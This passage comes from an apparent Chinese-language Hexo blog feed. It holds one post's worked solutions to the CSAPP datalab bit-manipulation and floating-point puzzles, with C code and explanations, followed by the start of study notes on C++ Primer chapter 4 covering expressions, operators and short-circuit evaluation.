class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="isAsciiDigit">isAsciiDigit</h1><p>0x30 位模式为 <code>00…00 0011 0000</code></p><p>0x39 位模式为 <code>00…00 0011 1001</code></p><p>可以分成两步来判断：</p><ol><li>前24位为 00…00 0011</li><li>后8位范围为 0000-1001，判断方法为减去1010后，判断是否为负数</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> cond1 = !((x &gt;&gt; <span class="number">4</span>) ^ <span class="number">0b11</span>);</span><br><span class="line">  <span class="type">int</span> sub_res = (x &amp; <span class="number">0xF</span>) + (~<span class="number">0xA</span> + <span class="number">1</span>);  <span class="comment">// 一定要加括号 &amp;优先级比+/-低</span></span><br><span class="line">  <span class="type">int</span> cond2 = (sub_res &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> cond1 &amp; cond2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="conditional">conditional</h1><p>结果一定形如：<code>return (expr &amp; y) | (~expr &amp; z);</code></p><p>当x=0时，expr = 0, ~expr = 11…11</p><p>当x≠0时，expr = 11…11, ~exp = 0</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// x =  0, mask = 00000000</span></span><br><span class="line">  <span class="comment">// x != 0, mask = 11111111</span></span><br><span class="line">  <span class="type">int</span> mask = !!(x) &lt;&lt; <span class="number">31</span> &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">return</span> (mask &amp; y) | (~mask &amp; z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="isLessOrEqual">isLessOrEqual</h1><p>直接想法是做减法，判断差的符号。<br>但注意，只有同号时做+/-才不用考虑溢出，其他情况都需要单独判断。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">isLessOrEqual 等价于 x &lt;= y ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">然后去看什么样的情况下行</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> x == y</span><br><span class="line">cond1 = !(x ^ y);</span><br><span class="line"></span><br><span class="line">sign_x = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span></span><br><span class="line">sign_y = (y &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span></span><br><span class="line"><span class="number">2</span> x + y -</span><br><span class="line">cond2 = !(!sign_x &amp; sign_y)  外层!表示x+ y-不行</span><br><span class="line"></span><br><span class="line"><span class="number">3</span> x - y +</span><br><span class="line">cond3 = sign_x &amp; !sign_y</span><br><span class="line"></span><br><span class="line"><span class="number">4</span> x - y - 此时做减法才不会溢出</span><br><span class="line"><span class="type">int</span> cond4 = (x + ~y + <span class="number">1</span>) &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> cond1 | (cond2 &amp; (cond3 | cond4))  不满足x+ y-并且...</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> cond1 = !(x ^ y);</span><br><span class="line">  <span class="type">int</span> sign_x = x &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> sign_y = y &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> cond2 = !(~sign_x &amp; sign_y);</span><br><span class="line">  <span class="type">int</span> cond3 = sign_x &amp; ~sign_y;</span><br><span class="line">  <span class="type">int</span> cond4 = (x + ~y + <span class="number">1</span>) &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> cond1 | (cond2 &amp; (cond3 | cond4));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>💡 优先级： ! ~ + &lt;&lt; &amp; |</p></blockquote><h1 id="logicalNeg">logicalNeg</h1><p>关键：找出0和非0数的关系，非0数有正负，x|(-x)的符号位一定为1</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> neg_x = ~x + <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> sign_x = (x | neg_x) &gt;&gt; <span class="number">31</span>;  <span class="comment">// 0得到0，非0得到11..11</span></span><br><span class="line">  <span class="keyword">return</span> sign_x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="howManyBits">howManyBits</h1><ul><li>0 只需要1位表示</li><li>负数，对于-1（111, 11111, 111111）都是只需要1位表示<ul><li>对于更一般的 1110 0011, 需要1位表示符号，然后将最高位0的位数命名位high_bit，则需要high_bit + 1位表示（可以通过取反，看最高位1确定high_bit）<br>也可以这样理解：1位符号位+数值的无符号数表示，就像：bin(-7)='-0b111</li></ul></li><li>正数，需要1位符号位+数值表示</li></ul><p>现在难点就变成如何求high_bit，即求最高位的1：</p><p>0010 0000 0000 0000 | <s>0000 0000 0000 0000</s><br><s>0000 0000 0000 0000</s> | 0001 0000 0000 0000</p><p>上面给出2个例子，首先看高16位是否有1</p><p>若有，右移动16位，继续去看1在哪（在高16位中同理去求）</p><p>若无，则意味着高16位全为0，不需要右移（在低16位中同理）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">howManyBits</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> is_zero = !x;</span><br><span class="line">  <span class="type">int</span> is_neg = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> mask = (!!x) &lt;&lt; <span class="number">31</span> &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  x = (is_neg &amp; ~x) | (~is_neg &amp; x);</span><br><span class="line">  <span class="comment">// 0010 0000 0000 0000 | 0000 0000 0000 0000</span></span><br><span class="line">  <span class="comment">// -------------------            16</span></span><br><span class="line">  <span class="comment">// 0000 0000 0000 0000 | 0001 0000 0000 0000</span></span><br><span class="line">  <span class="comment">//                       -------------------</span></span><br><span class="line">  <span class="type">int</span> bit_16 = !!(x &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">4</span>;  <span class="comment">// 16 0</span></span><br><span class="line">  x &gt;&gt;= bit_16;</span><br><span class="line">  <span class="type">int</span> bit_8 = !!(x &gt;&gt; <span class="number">8</span>) &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  x &gt;&gt;= bit_8;</span><br><span class="line">  <span class="type">int</span> bit_4 = !!(x &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">  x &gt;&gt;= bit_4;</span><br><span class="line">  <span class="type">int</span> bit_2 = !!(x &gt;&gt; <span class="number">2</span>) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  x &gt;&gt;= bit_2;</span><br><span class="line">  <span class="type">int</span> bit_1 = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  x &gt;&gt;= bit_1;</span><br><span class="line">  <span class="type">int</span> bit_0 = x;</span><br><span class="line">  <span class="type">int</span> high_bit = <span class="number">1</span> + bit_16 + bit_8 + bit_4 + bit_2 + bit_1 + bit_0;</span><br><span class="line">  <span class="keyword">return</span> is_zero | (mask &amp; high_bit);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="floatScale2">floatScale2</h1><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>F</mi><mo>=</mo><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mi>s</mi></msup><mo>×</mo><mi>M</mi><mo>×</mo><msup><mn>2</mn><mi>E</mi></msup></mrow><annotation encoding="application/x-tex">F = (-1)^s\times M\times 2^{E}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8913em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">E</span></span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>对于InF/NaN，直接输出argument</li><li>对于非规范数，直接将frac左移1位——溢出到exp阶码域没关系，结果依然是对的</li><li>对于规范数，由于E位于指数位置，E直接增一就行，exp = E + bias也是增一。由于EXP取值范围为[1, 254], 增加到255也没关系，INF/NaN都行。</li></ul><blockquote><p>💡对于Denormalized Values，frac直接左移1位，移除到阶码域结果也是正确的。<br>尾数域最高位权重为1/2， 移除到阶码域变成规范数后，M=1+frac，这时E由于解释方式的差异值不变，而M多的这个1恰好是1/2的2倍。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">  <span class="type">int</span> sign = uf &gt;&gt; <span class="number">31</span>;  <span class="comment">// 无符号数使用逻辑右移</span></span><br><span class="line">  <span class="type">int</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">  <span class="type">int</span> frac = uf &amp; <span class="number">0x7FFFFF</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xFF</span>) &#123;  <span class="comment">// Inf/NaN</span></span><br><span class="line">    <span class="keyword">return</span> uf;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">exp</span>) &#123;  <span class="comment">// denormalized number</span></span><br><span class="line">    <span class="keyword">return</span> sign &lt;&lt; <span class="number">31</span> | frac &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;  <span class="comment">// normalized number</span></span><br><span class="line">    ++<span class="built_in">exp</span>;</span><br><span class="line">    <span class="keyword">return</span> sign &lt;&lt; <span class="number">31</span> | <span class="built_in">exp</span> &lt;&lt; <span class="number">23</span> | frac;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="floatFloat2Int">floatFloat2Int</h1><p>先排除denormalized number和speical number，对于规范数：</p><p>先通过E = exp - 127 计算阶码</p><p>再通过 <code>|0x800000</code> （5个0）把隐含的1加上，然后根据E进行移位</p><p>最后根据符号位，看是否需要加负号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">  <span class="type">int</span> sign = uf &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> <span class="built_in">exp</span> = uf &gt;&gt; <span class="number">23</span> &amp; <span class="number">0xFF</span>;</span><br><span class="line">  <span class="type">int</span> frac = uf &amp; <span class="number">0x7FFFFF</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xFF</span>) &#123;  <span class="comment">// Inf/NaN</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">exp</span>) &#123;  <span class="comment">// denormalized number</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">int</span> E = <span class="built_in">exp</span> - <span class="number">127</span>;</span><br><span class="line">    frac |= <span class="number">0x800000</span>;  <span class="comment">// 后面有5个0: 20/4=5</span></span><br><span class="line">    <span class="keyword">if</span> (E &gt;= <span class="number">31</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (E &gt;= <span class="number">23</span>) &#123;</span><br><span class="line">      frac &lt;&lt;= (E - <span class="number">23</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (E &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">      frac &gt;&gt;= (<span class="number">23</span> - E);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (sign)  frac = ~frac + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> frac;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="floatPower2">floatPower2</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatPower2</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="comment">//                        Min                    Max</span></span><br><span class="line">  <span class="comment">// denormalized: 2^(-23)*2^(1-127)=2^(-149)   &lt;2^(-126)</span></span><br><span class="line">  <span class="comment">// normalized:   2^(-126)                     &lt;2^(254-127)*2=2^(128)</span></span><br><span class="line">  <span class="keyword">if</span> (x &lt; <span class="number">-149</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; <span class="number">-126</span>) &#123;</span><br><span class="line"><span class="comment">// denormalized</span></span><br><span class="line">    <span class="comment">// &lt;--------------------------</span></span><br><span class="line">    <span class="comment">// ---&gt; 负的越多，就需要往右退更多</span></span><br><span class="line">    <span class="keyword">return</span> (x + <span class="number">127</span>) &lt;&lt; <span class="number">23</span> | <span class="number">1</span> &lt;&lt; (<span class="number">23</span> + x + <span class="number">126</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; <span class="number">128</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (x + <span class="number">127</span>) &lt;&lt; <span class="number">23</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFF</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考资料">参考资料</h1><ul><li>【【深入理解计算机系统 实验1 CSAPP】datalab + 环境搭建 data lab】 <a href="https://www.bilibili.com/video/BV183411k7VM/?share_source=copy_web&amp;vd_source=1e8c177289cfed3be80e766714c3f11f">https://www.bilibili.com/video/BV183411k7VM/?share_source=copy_web&amp;vd_source=1e8c177289cfed3be80e766714c3f11f</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第4章 表达式</title>
      <link href="/2023/05/17/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch04/"/>
      <url>/2023/05/17/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch04/</url>
      
        <content type="html"><![CDATA[<h2 id="表达式基础">表达式基础</h2><ul><li><strong>运算对象转换</strong>：小整数类型会被提升为较大的整数类型</li><li><strong>重载运算符</strong>：当运算符作用在类类型的运算对象时，用户可以自行定义其含义。</li><li><strong>左值和右值</strong>：<ul><li>C中原意：左值<strong>可以</strong>在表达式左边，右值不能。</li><li><code>C++</code>：当一个对象被用作<strong>右值</strong>的时候，用的是对象的<strong>值</strong>（内容）；</li><li>被用做<strong>左值</strong>时，用的是对象的<strong>身份</strong>（在内存中的位置）。</li></ul></li><li><strong>求值顺序</strong>：<code>int i = f1() + f2()</code><ul><li>先计算<code>f1() + f2()</code>,再计算<code>int i = f1() + f2()</code>。但是f1和f2的计算<strong>先后不确定</strong></li><li>但是，如果f1、f2都对同一对象进行了修改，因为顺序不确定，所以会编译出错，显示未定义</li></ul></li></ul><h2 id="算术运算符">算术运算符</h2><ul><li><strong>溢出</strong>：当计算的结果超出该类型所能表示的范围时就会产生溢出。</li><li><strong>bool类型不应该参与计算</strong><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> b=<span class="literal">true</span>;</span><br><span class="line"><span class="type">bool</span> b2=-b;   <span class="comment">//仍然为true</span></span><br><span class="line"><span class="comment">//b为true，提升为对应int=1，-b=-1</span></span><br><span class="line"><span class="comment">//b2=-1≠0，所以b2仍未true</span></span><br></pre></td></tr></table></figure></li><li>取余运算m%n，结果符号与m相同</li></ul><h2 id="逻辑运算符">逻辑运算符</h2><ul><li><strong>短路求值</strong>：逻辑与运算符和逻辑或运算符都是先求左侧运算对象的值再求右侧运算对象的值，当且仅当左侧运算对象无法确定表达式的结果时才会计算右侧运算对象的值。<strong>先左再右</strong></li><li>小技巧，声明为引用类型可以避免对元素的拷贝，如下，如string特别大时可以节省大量时间。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;string&gt; text;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">const</span> <span class="keyword">auto</span> &amp;s: text)&#123;</span><br><span class="line">  cout&lt;&lt;s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 